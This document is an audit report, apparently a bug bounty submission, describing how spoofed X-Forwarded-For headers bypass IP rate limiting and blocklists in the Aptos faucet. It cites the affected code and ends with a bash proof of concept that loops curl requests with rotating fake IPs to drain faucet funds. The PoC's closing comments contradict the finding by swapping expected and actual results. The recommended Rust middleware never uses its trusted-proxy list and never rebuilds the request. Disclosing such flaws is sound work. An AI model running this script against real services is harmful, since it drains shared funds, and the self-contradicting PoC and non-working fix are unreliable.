# Audit Report

## Title
IP Spoofing Vulnerability in Faucet Middleware Allows Rate Limit Bypass and Fund Draining

## Summary
The faucet service uses poem framework's `RealIp` extractor to determine client IP addresses for rate limiting and access control, but lacks trusted proxy configuration. This allows attackers to spoof their IP address via HTTP headers (`X-Forwarded-For`, `X-Real-IP`, `Forwarded`), bypassing all IP-based security controls including rate limits and IP blocklists, enabling unlimited faucet fund draining.

## Finding Description

The middleware logging function extracts client IPs using poem's `RealIp::from_request()`: [1](#0-0) 

This extracted IP is then used throughout the faucet service for critical security decisions. The fund endpoint relies on this source IP: [2](#0-1) 

The core security issue is that poem's `RealIp` extractor (version 3.1.3) blindly trusts proxy headers without any trusted proxy configuration: [3](#0-2) 

The IP-based rate limiting checker directly uses this potentially spoofed IP as its rate limit key: [4](#0-3) 

**Attack Path:**
1. Attacker sends HTTP request to faucet with header: `X-Forwarded-For: 1.2.3.4`
2. `RealIp::from_request()` extracts `1.2.3.4` as source_ip
3. Rate limiter uses `1.2.3.4` as the key, thinks this is the first request from that IP
4. Attacker repeats with `X-Forwarded-For: 5.6.7.8`, bypassing rate limit again
5. Attacker drains faucet by rotating through unlimited spoofed IPs

The server setup provides no trusted proxy configuration: [5](#0-4) 

While HAProxy configurations show the `Forwarded` header is added by proxies: [6](#0-5) 

Without trusted proxy configuration, clients can set these headers themselves when accessing the faucet directly or if the proxy doesn't strip existing headers.

## Impact Explanation

**Severity: High** (per Aptos Bug Bounty criteria)

This vulnerability allows:
- **Complete bypass of IP-based rate limiting** (both Redis and Memory implementations)
- **Bypass of IP blocklist controls**
- **Unlimited faucet fund draining** on testnets

While this affects the faucet auxiliary service (not core consensus), it meets High severity criteria as it causes "Significant protocol violations" in the faucet's security model and enables complete fund loss from the faucet account, potentially requiring manual intervention to restore testnet functionality.

## Likelihood Explanation

**Likelihood: High**

This vulnerability is:
- **Trivial to exploit**: Requires only setting HTTP headers, no special tools needed
- **Always exploitable**: No race conditions or timing dependencies
- **Widely applicable**: Affects all faucet deployments behind TLS-terminating proxies or with direct access
- **Currently unmitigated**: No trusted proxy configuration exists in the codebase

The attack requires zero authentication and works with standard HTTP clients (curl, browsers with extensions, etc.).

## Recommendation

Implement trusted proxy configuration for the poem server. Since poem 3.x doesn't natively support trusted proxy configuration, implement a custom middleware that:

1. **Validates proxy headers**: Only trust forwarding headers from known proxy IPs
2. **Strips untrusted headers**: Remove proxy headers from untrusted sources
3. **Uses socket address as fallback**: For direct connections, use the actual TCP peer address

Example implementation:
```rust
// Add to middleware/mod.rs
pub async fn trusted_proxy_middleware<E: Endpoint>(next: E, request: Request) -> Result<Response> {
    let peer_addr = request.remote_addr();
    
    // Define trusted proxy CIDRs (configure based on deployment)
    const TRUSTED_PROXIES: &[&str] = &["10.0.0.0/8", "172.16.0.0/12"];
    
    // If request is not from trusted proxy, strip forwarding headers
    if !is_from_trusted_proxy(peer_addr) {
        let mut headers = request.headers().clone();
        headers.remove("X-Forwarded-For");
        headers.remove("X-Real-IP");
        headers.remove("Forwarded");
        // Rebuild request with cleaned headers
    }
    
    next.get_response(request).await
}
```

Then apply this middleware before the logging middleware in the route configuration.

**Alternative solution**: Ensure faucet is only accessible via the trusted proxy and implement network-level restrictions to prevent direct access.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Bypass rate limiting by spoofing IP addresses

FAUCET_URL="http://faucet.testnet.example.com/fund"
RECIPIENT="0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

# Make 100 requests with different spoofed IPs (should be rate limited after 3-5)
for i in {1..100}; do
    SPOOFED_IP="10.0.$((i/256)).$((i%256))"
    
    curl -X POST "$FAUCET_URL" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $SPOOFED_IP" \
        -d "{\"address\": \"$RECIPIENT\", \"amount\": 100000000}" \
        -w "Request $i (IP: $SPOOFED_IP): HTTP %{http_code}\n" \
        -s -o /dev/null
    
    sleep 0.1
done

# Expected: All 100 requests succeed (rate limit bypassed)
# Actual without fix: Rate limited after 3-5 requests
# Impact: Faucet funds drained through unlimited requests
```

## Notes

This vulnerability is specific to the faucet auxiliary service and does not affect core Aptos blockchain consensus, state management, or validator operations. However, it represents a significant security flaw in the faucet's rate limiting and access control mechanisms, allowing complete bypass of IP-based protections.

### Citations

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L25-28)
```rust
    let source_ip = RealIp::from_request(&request, &mut RequestBody::default())
        .await
        .map(|ip| ip.0)
        .unwrap_or(None);
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-225)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };
```

**File:** Cargo.toml (L724-724)
```text
poem = { version = "3.1.3", features = ["anyhow", "compression", "rustls"] }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L44-51)
```rust
    pub async fn ratelimit_key_value(&self, data: &CheckerData) -> Result<String, AptosTapError> {
        match self {
            RatelimitKeyProvider::Ip => Ok(data.source_ip.to_string()),
            RatelimitKeyProvider::Jwt(jwt_verifier) => {
                jwt_verifier.validate_jwt(data.headers.clone()).await
            },
        }
    }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L207-219)
```rust
        let api_server_future = Server::new_with_acceptor(TcpAcceptor::from_tokio(listener)?).run(
            Route::new()
                .nest(
                    &self.server_config.api_path_base,
                    Route::new()
                        .nest("", api_service)
                        .catch_all_error(convert_error),
                )
                .at("/spec.json", spec_json)
                .at("/spec.yaml", spec_yaml)
                .at("/mint", poem::post(mint.data(fund_api_components)))
                .with(cors)
                .around(middleware_log),
```

**File:** docker/compose/aptos-node/haproxy.cfg (L100-101)
```text
    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"
```
